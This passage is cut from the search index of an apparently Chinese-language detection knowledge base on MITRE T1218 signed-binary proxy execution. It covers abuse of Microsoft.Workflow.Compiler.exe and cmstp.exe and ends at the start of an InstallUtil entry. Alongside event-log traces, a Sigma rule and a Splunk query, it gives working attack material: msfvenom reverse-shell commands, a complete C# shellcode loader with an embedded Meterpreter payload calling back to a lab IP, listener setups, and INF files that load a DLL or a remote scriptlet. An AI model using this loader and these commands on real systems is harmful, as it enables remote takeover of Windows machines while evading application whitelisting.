add.tcp\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u67e5\u770b\u4f1a\u8bdd","text":"<p>\u8fdb\u7a0b\u610f\u5916\u7ec8\u6b62\uff0c\u672a\u83b7\u5f97\u4f1a\u8bdd\uff0c\u5229\u7528\u65b9\u6cd52\u8fdb\u884c\u6d4b\u8bd5\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#2","title":"\u65b9\u6cd52","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#msfshellcode","title":"msf\u751f\u6210shellcode","text":"<pre><code>msfvenom  -p windows/x64/shell/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp\n</code></pre> <pre><code>using System;\n\nusing System.Workflow.Activities;\n\nusing System.Net;\n\nusing System.Net.Sockets;\n\nusing System.Runtime.InteropServices;\n\nusing System.Threading;\n\nclass yrDaTlg : SequentialWorkflowActivity {\n\n[DllImport(\"kernel32\")] private static extern IntPtr VirtualAlloc(UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ);\n\n[DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPt rDStOGXQMMkP, uint CzzIpcuQppQSTBJ, uint JCFImGhkRqtwANx, out uint exgVp Sg);\n\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, ref UInt32 SZtdSB);\n\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM);\n\npublic yrDaTlg() {\n\nbyte[] QWKpWKhcs =\n\n{0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,\n0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,\n0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,\n0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,\n0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,\n0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,\n0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,\n0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,\n0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,\n0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,\n0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,\n0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,\n0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,\n0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,\n0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,\n0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,\n0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x7e,0x92,0x41,0x54,0x49,0x89,0xe4,\n0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,\n0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,\n0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,\n0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,\n0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,\n0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,\n0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,\n0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,\n0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,\n0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,\n0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,\n0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,\n0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,\n0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,\n0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,\n0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,\n0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };\n\nIntPtr AmnGaO = VirtualAlloc(0, (UInt32)QWKpWKhcs.Length, 0x3000, 0x04);\n\nMarshal.Copy(QWKpWKhcs, 0, (IntPtr)(AmnGaO), QWKpWKhcs.Length);\n\nIntPtr oXmoNUYvivZlXj = IntPtr.Zero; UInt32 XVXTOi = 0; IntPtr pAeCTf wBS = IntPtr.Zero;\n\nuint BnhanUiUJaetgy;\n\nbool iSdNUQK = VirtualProtect(AmnGaO, (uint)0x1000, (uint)0x20, out BnhanUiUJaetgy);\n\noXmoNUYvivZlXj = CreateThread(0, 0, AmnGaO, pAeCTfwBS, 0, ref XVXTOi);\n\nWaitForSingleObject(oXmoNUYvivZlXj, 0xFFFFFFFF);}\n\n}\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u6267\u884c\u76d1\u542c","text":"<pre><code>use exploit/multi/handler\nmsf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\nmsf exploit(multi/handler) &gt; set lhost 192.168.126.146\nmsf exploit(multi/handler) &gt; set lport 4444\nmsf exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#payload_1","title":"\u6267\u884cpayload","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml 1.cs\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#session","title":"\u63a5\u53d7session","text":"<p>\u8fdb\u7a0b\u610f\u5916\u7ec8\u6b62\uff0c\u672a\u83b7\u5f97\u4f1a\u8bdd\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>\u4e8b\u4ef6ID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f: #\u65b9\u6cd51\n\u65b0\u8fdb\u7a0b ID:0xb18\n\u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1)\n\u521b\u5efa\u8005\u8fdb\u7a0b ID:0xaa0\n\u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe  poc.xml add.tcp\n\n\u4e8b\u4ef6ID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f: #\u65b9\u6cd52\n\u65b0\u8fdb\u7a0b ID:0x804\n\u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1)\n\u521b\u5efa\u8005\u8fdb\u7a0b ID:0xe8\n\u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe  poc.xml 1.cs\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_9","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Microsoft Compiler\nstatus: experimental\ndescription: \u68c0\u6d4bMicrosoft\u5de5\u4f5c\u6d41\u7f16\u8bd1\u5668\u7684\u8c03\u7528\uff0c\u8be5\u7f16\u8bd1\u5668\u53ef\u80fd\u5141\u8bb8\u6267\u884c\u4efb\u610f\u65e0\u7b26\u53f7\u4ee3\u7801\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nreferences:\n    - https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\Microsoft.Workflow.Compiler.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate MWC use (unlikely in modern enterprise environments)\nlevel: high\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_10","title":"\u5efa\u8bae","text":"<p>\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_11","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-001</p> <p>https://attack.mitre.org/techniques/T1218/001/</p> <p>\u57fa\u4e8e\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload\u7b2c\u516d\u5b63</p> <p>https://micro8.gitbook.io/micro8/contents-1/71-80/76-ji-yu-bai-ming-dan-compiler.exe-zhi-hang-payload-di-liu-ji</p> <p>\u8fdc\u63a7\u514d\u6740\u4e13\u9898(43)-\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload</p> <p>http://sec.nmask.cn/article_content?a_id=1b5c0f6a2e669c7605d42fd88f3f90fb</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/","title":"T1218-003-win-\u57fa\u4e8e\u767d\u540d\u5355Cmstp.exe\u6267\u884cPayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5fae\u8f6f\u7684\u547d\u4ee4\u884c\u7a0b\u5e8fCMSTP.exe\u7528\u4e8e\u5b89\u88c5\u8fde\u63a5\u7ba1\u7406\u5668\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002CMSTP.exe\u5c06\u6536\u5230\u7684\u5b89\u88c5\u4fe1\u606f\u6587\u4ef6\uff08INF\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c\u5b89\u88c5\u7528\u4e8e\u8fdc\u7a0b\u8bbf\u95ee\u8fde\u63a5\u7684\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5411CMSTP.exe\u63d0\u4f9b\u5e26\u6076\u610f\u547d\u4ee4\u7684INF\u6587\u4ef6\u3002\u4e0eRegsvr32/\"Squiblydoo\"\u7c7b\u4f3c\uff0cCMSTP.exe\u53ef\u80fd\u88ab\u6ee5\u7528\u6765\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u52a0\u8f7d\u548c\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\u548c/\u6216COM\u811a\u672c\u5c0f\u7a0b\u5e8f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u7528CMSTP.exe\u6765\u7ed5\u8fc7AppLocker\u53ca\u5176\u4ed6\u767d\u540d\u5355\u9632\u5fa1\uff0c\u56e0\u4e3aCMSTP.exe\u672c\u8eab\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u3001\u5df2\u7b7e\u540d\u7684\u5fae\u8f6f\u5e94\u7528\u3002</p> <p>CMSTP.exe\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u6765\u7ed5\u8fc7\u7528\u6237\u8d26\u53f7\u63a7\u5236\u5e76\u901a\u8fc7\u81ea\u52a8\u5347\u7ea7\u7684COM\u63a5\u53e3\u6267\u884cINF\u6587\u4ef6\u4e2d\u7684\u4efb\u610f\u6076\u610f\u547d\u4ee4\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Cmstp\u5b89\u88c5\u6216\u5220\u9664\u201c\u8fde\u63a5\u7ba1\u7406\u5668\u201d\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002\u5982\u679c\u4e0d\u542b\u53ef\u9009\u53c2\u6570\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u5219 cmstp \u4f1a\u4f7f\u7528\u5bf9\u5e94\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u7684\u6743\u9650\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u6765\u5b89\u88c5\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp</p> <p>\u8bf4\u660e\uff1aCmstp.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cCmstp\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Cmstp\u8c03\u7528\u3002</p> <p>Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\Windows\\System32\\cmstp.exe\nC:\\Windows\\SysWOW64\\cmstp.exe\n</code></pre> <p>Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\Windows\\System32\\cmstp.exe\nC:\\Windows\\SysWOW64\\cmstp.exe\n</code></pre> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows 7</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#payloaddll","title":"\u751f\u6210payload.dll","text":"<pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53  -f dll -o payload.dll\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<p>\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b)</p> <pre><code>msf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 53\nlport =&gt; 53\nmsf5 exploit(multi/handler) &gt; set AutoRunScript migrate -f\nAutoRunScript =&gt; migrate -f\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#inf","title":"inf\u6a21\u677f","text":"<pre><code>    [version]\n    Signature=$chicago$\n    AdvancedINF=2.5\n    [DefaultInstall_SingleUser]\n    UnRegisterOCXs=UnRegisterOCXSection\n    [UnRegisterOCXSection]\n     C:\\payload.dll\n    [Strings]\n    AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"\n    ServiceName=\"12306Br0\"\n    ShortSvcName=\"12306Br0\"\n</code></pre> <p>INF\u6587\u4ef6\u7684RegisterOCXSection\u9700\u8981\u5305\u542b\u6076\u610fDLL\u6587\u4ef6\u7684\u672c\u5730\u8def\u5f84\u6216\u8fdc\u7a0b\u6267\u884c\u7684WebDAV\u4f4d\u7f6e</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>cmstp.exe /ni /s C:\\Users\\12306Br0\\Desktop\\a\\add.inf\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#shell","title":"\u53cd\u5f39shell","text":"<p>\u672a\u6210\u529f\u83b7\u53d6\u5230shell</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>windows\u5b89\u5168\u65e5\u5fd7\n\u4e8b\u4ef6ID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x9b0\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\cmstp.exe\n\nsysmon\u65e5\u5fd7\n\u4e8b\u4ef6ID\uff1a1\nOriginalFileName: CMSTP.EXE\nCommandLine: cmstp.exe  /ni /s C:\\Users\\12306Br0\\Desktop\\a\\add.inf\nCurrentDirectory: C:\\Windows\\system32\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\nLogonId: 0x6e1ea\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=BA135738EF1FB2F4C2C6C610BE2C4E855A526668\nParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00}\nParentProcessId: 1988\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\"\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#inf_1","title":"inf\u6587\u4ef6\u5185\u5bb9","text":"<pre><code>    [version]\n    Signature=$chicago$\n    AdvancedINF=2.5\n    [DefaultInstall_SingleUser]\n    UnRegisterOCXs=UnRegisterOCXSection\n    [UnRegisterOCXSection]\n    %11%\\scrobj.dll,NI,http://192.168.1.4/cmstp_rev_53_x64.sct\n    [Strings]\n    AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"\n    ServiceName=\"Micropoor\"\n    ShortSvcName=\"Micropoor\"\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#splunk","title":"splunk\u89c4\u5219","text":"<pre><code>index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\cmstp.exe\u201d) OR (EventCode=10 SourceImage=\u201d*\\\\cmstp.exe\u201d ) OR (EventCode=10 CallTrace=\u201d*CMLUA.dll*\u201d) (EventCode IN (12,13) TargetObject=\u201d*\\\\CMMGR32.exe\u201d OR (EventCode=12 TargetObject=\u201dHKLM\\\\SOFTWARE\\\\Microsoft\\\\Tracing\\\\cmstp*\u201d)\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_9","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-003</p> <p>https://attack.mitre.org/techniques/T1218/003/</p> <p>windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0b\uff09</p> <p>http://www.safe6.cn/article/157#directory030494471069429444</p> <p>\u57fa\u4e8e\u767d\u540d\u5355Cmstp.exe\u6267\u884cpayload\u7b2c\u5341\u516d\u5b63</p> <p>https://www.bookstack.cn/read/Micro8/Chapter1-81-90-87_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AD%E5%AD%A3.md</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/","title":"T1218-004-win-\u57fa\u4e8e\u767d\u540d\u5355Installutil.exe\u6267\u884cpayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8fInstallUtil\u53ef\u7528\u4e8e\u901a\u8fc7\u6267\u884c.NET\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u6307\u5b9a\u7684\u7279\u5b9a\u5b89\u88c5\u7a0b\u5e8f\u7ec4\u4ef6\u6765\u5b89\u88c5\u548c\u5378\u8f7d\u8d44\u6e90\u3002</p> <p>InstallUtil\u4f4d\u4e8eWindows\u7cfb\u7edf\u4e0a\u7684.NET\u76ee\u5f55\u4e2d\uff1a</p> <p>C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exe</p> 